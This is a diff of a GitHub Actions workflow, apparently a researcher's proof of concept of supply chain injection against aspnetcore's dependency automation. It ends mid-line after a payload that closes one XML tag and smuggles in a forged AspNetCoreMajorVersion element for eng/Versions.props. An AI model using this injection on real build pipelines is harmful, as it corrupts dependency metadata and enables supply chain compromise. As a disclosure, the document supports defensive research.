@@ -1,7 +1,6 @@
-name: "Exploit PoC: Indirect Prompt Injection in Supply Chain"
-# Researcher: HackerMD (Mohamadisha Shaikh)
-# Target: Microsoft .NET/aspnetcore Dependency Automation
-# Severity: High (Critical Infrastructure Modification)
+name: "Exploit PoC: Supply Chain Injection"
+# Researcher: HackerMD
+# Impact: Unauthorized modification of eng/Versions.props
 
 on:
   workflow_dispatch:
@@ -11,10 +10,11 @@ jobs:
     name: "Simulate Supply Chain Attack"
     runs-on: ubuntu-latest
     steps:
-      - name: "Clone Repository Infrastructure"
+      - name: "Clone Repository"
         uses: actions/checkout@v4
 
       - name: "Inject Malicious Metadata"
         id: metadata
-        # We use a base64 encoded payload to bypass shell escaping issues entirely.
-        # Payload: 1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
+        run: |
+          # This simulates a poisoned version from an untrusted source
+          PAYLOAD='1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>
